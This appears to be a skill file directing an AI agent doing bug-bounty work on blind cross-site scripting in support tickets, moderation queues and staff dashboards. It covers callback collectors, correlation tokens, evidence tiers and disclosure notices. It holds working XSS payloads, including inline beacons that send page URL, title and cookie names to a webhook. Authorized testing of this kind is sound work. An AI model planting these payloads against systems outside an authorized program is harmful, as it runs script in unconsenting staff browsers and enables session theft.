---
name: blind-xss
description: Use when the plausible consumer of an input is a human or system the agent cannot observe - support tickets, moderation queues, grant/partner applications, staff dashboards, log viewers, or any stored field with unaccountable render points. Load as a lane from the xss router. Owns callback collection, correlation, capture boundaries, and deferred (Pending-OOB) lifecycle for blind XSS.
---

# Blind XSS Lane

Blind XSS is stored XSS where the render point is neither owned nor observable.
The proof is asynchronous and external, the render context is unknown at
payload-authoring time, the blast radius involves non-owned humans, the
lifecycle runs for days past the end of the run, and the evidence standard
requires binding a later fire back to an earlier submission. None of the
owned-render-point loop in `stored-xss` applies here.

## Load First

- `xss` (router; owns pressure states and status rules)
- `live-testing-policy`, `general-security-testing-policy`,
  `attempt-recording-policy`
- `account-testing-policy` when the submission needs an owned account
- `public-forums` when the artifact is publicly visible

`program-testing-policy` remains authoritative on scope, rate, and per-program
staff-testing prohibitions. Several programs prohibit staff-facing testing
outright; nothing in this lane overrides that check.

## Trigger

The trigger is a property of the **consumer**, not of the response:

- a form whose stated purpose is to be read by staff - support, contact,
  abuse, DMCA, appeal, refund, bug report, feedback, verification,
  partner/creator/grant application, careers
- a moderation or review pipeline - report-a-user, report-content,
  marketplace or app submission
- a value that lands in operational tooling - request headers (`User-Agent`,
  `Referer`, `X-Forwarded-For`) into a log viewer, a crafted error into an
  exception dashboard, a filename into an ops console
- any stored field whose render points the agent has enumerated and cannot
  fully account for

Also trigger when a lane is about to be closed as inert: if the observation
channel was only the originating page, blind is the untested channel, not a
conclusion.

## Collector Contract

Resolve the callback base from **`BBH_XSS_CALLBACK_BASE`**. Never hardcode a
per-researcher URL or webhook into this skill; agents run on other hosts and
the identifier is researcher-specific. A Discord webhook URL is a bearer
credential and lives only in environment configuration, never in shared text.

Primary collector: XSS.report-style hosted callback (env var holds the
`https://xss.report/c/<handle>` base).

Fallback collector: a Discord webhook, used when the program prohibits
third-party callback infrastructure for blind findings (commonly worded as
"do not use third-party callbacks for blind/OOB vulnerabilities"). The
webhook form is also the minimal-capture instrument: it sends only what the
payload explicitly writes, with no automatic cookie, storage, or DOM
collection by the collector.

## Payload Contract - Exactly Two

One payload per distinct surface, so a fire identifies its source. Place into
**every** field of a submission a reviewer reads, not only the message body:
name, subject, company, URL, order reference, attachment filename. The body
is usually the one field someone escaped.

### Primary - hosted collector, external script

```text
"><script src=BBH_XSS_CALLBACK_BASE></script>
```

Works where the collector origin passes `script-src`. Collector-served logic
survives truncation and can be updated after planting.

### Fallback - Discord webhook, inline beacon

The webhook endpoint serves no JavaScript and requires POST, so the
`script src` form cannot work against it. The payload performs the request
itself. Send **both** transport variants when possible; a strict CSP may
block one and allow the other (`connect-src` governs `fetch`, `img-src`
governs the image form):

```text
"><script>var c=document.cookie.split(';').map(x=>x.trim().split('=')[0]).filter(Boolean).join(',');fetch('WEBHOOK_URL',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'FIRE <program>-<surface>-<field>-<runid> | '+location.href+' | '+document.title+' | cookies: '+c})})</script>
"><img src onerror="new Image().src='WEBHOOK_URL?content='+encodeURIComponent('FIRE <program>-<surface>-<field>-<runid> | '+location.href+' | cookies: '+c)">
```

Both tiers ride in every fallback submission: Tier 1 execution proof
(token, `location.href`, `document.title`) and Tier 2 extractability
(cookie **names only**), because which fields survive the render context and
CSP is never known in advance. Variant payloads are one submission's way of
covering multiple plausible render shapes - not license to iterate
submissions.

## Evidence Tiers

- **Tier 1 - execution proof.** Token, executing origin and path, page
  identifier. This is the basis of "the support form is vulnerable to XSS."
- **Tier 2 - extractability evidence.** Auth cookie **names and flags only**
  (non-HttpOnly status). Proves credential material is readable by JS in the
  privileged context without exfiltrating a single live session value. A
  report of "JS execution confirmed; non-HttpOnly auth cookies readable by
  name" is as valid for impact as one holding the value, and is
  unimpeachable on review.

Session values never leave the staff browser unless the program's own rules
explicitly permit full session capture. If a program permits it, that is a
deliberate per-program decision to record - not a default. Default hosted
collectors capture cookies, storage, and DOM automatically and cannot be
configured down; treat a fire from the primary collector accordingly and put
only Tier 1 plus recorded extractability facts in the report.

## Correlation - An Uncorrelated Callback Is Not Evidence

A blind fire arrives hours to weeks later, out of session, with no request
context. If the payload does not carry its own provenance, the fire proves
that *someone's* payload executed somewhere and cannot be written up.

Bind correlation **into the payload itself** - the `FIRE
<program>-<surface>-<field>-<runid>` token in the beacon content or the
collector's per-payload label - not only into local notes. Record the same
token in the Attempts entry at submission time. A fire is reportable only
when it joins to a submission record on that token.

Capture on fire, at minimum: the correlation token, `location.href`,
`document.title` or an equivalent page identifier, and a timestamp. That set
establishes *where* it executed, which is what the report needs.

## Disclosure Prose

Include, in plain prose, in the submission body (not in the same field as the
payload - a sanitizer stripping the payload can take the notice's formatting
with it):

> Hey <program>, this is an authorized security probe by researcher <handle>
> as part of <program>'s bug bounty program, <date>. No action is needed; the
> ticket can be disregarded and closed. Thank you and have a good day.

This is written for the support agent's workflow: they see it, know to
disregard, and close - instead of filing an IR ticket. Do not write "do not
open this": the mechanism requires that a staff member opens the ticket in
some view. Closing still requires opening.

The disclosure is for the *human*; the correlation token is for the *record*.
It does not unlock programs that prohibit staff-facing testing entirely.

## Acceptance Probe Before Payload

Storage cannot be verified, but acceptance usually can: a `200`, a ticket or
case ID, a confirmation email. Send an inert marked submission first to learn
field caps, validation, and whether the intake even reaches a human. A
payload into a form that silently drops submissions yields a permanent
unexplained negative.

## Blast Radius - The Risks That Actually Govern

Name the risk and bound the action; do not gate on importance.

- **Workflow disruption.** A payload that rewrites the DOM, redirects, opens
  dialogs, or breaks the ticket UI obstructs real support work for real
  users. Keep effects to a silent beacon. No `alert`, no navigation, no DOM
  mutation.
- **Attribution.** An unattributed script firing in an admin console is
  indistinguishable from a live intrusion. Carry the program attribution
  header on submission (`X-Bug-Bounty: <handle>`) where supported, plus the
  disclosure prose above.
- **Residue.** These submissions land in a production queue and stay. Record
  the ticket/case ID and the withdrawal or closure path at submission time.
  If the program provides no withdrawal mechanism, that is a fact to record,
  not a reason to skip - but it raises the bar on keeping the payload silent.
- **Volume.** One submission per distinct surface. Iterating payload families
  through a live support queue is a denial-of-service on human attention.

## Deferred Lifecycle

A blind payload does not resolve inside the run:

- A planted, correlated payload awaiting an external channel is pressure
  state **`pending`** (owned by the `xss` router). `pending` is not `cold`
  and must not trigger the automatic pivot. The agent moves on to other
  hypotheses without retiring the lane.
- Status on planting is **`Pending-OOB`** (owned by the `xss` router status
  rules). On fire, the lane jumps straight to `Confirmed` - a callback from a
  privileged view is browser-executed by definition.
- Register every planted payload in the retest queue with its correlation
  token, so a fire weeks later reaches a future agent.
- End-of-run reporting must list planted-and-pending payloads with surfaces
  and tokens. A run that planted six canaries and reported "no XSS found"
  has misreported its own state.

`xss-lifecycle` remains the owner of later-consumer expansion; link to it
rather than restating consumer discovery.

## Evidence Standard

Submission side: URL and method, field, exact payload variant, correlation
token, acceptance response, ticket/case ID, auth state, timestamp, disclosure
prose included (yes/no).

Fire side: token, executing origin and path, page identifier, delay, cookie
names if Tier 2 fired, viewer role if inferable.

The report is the join of the two. Neither half alone is a finding.
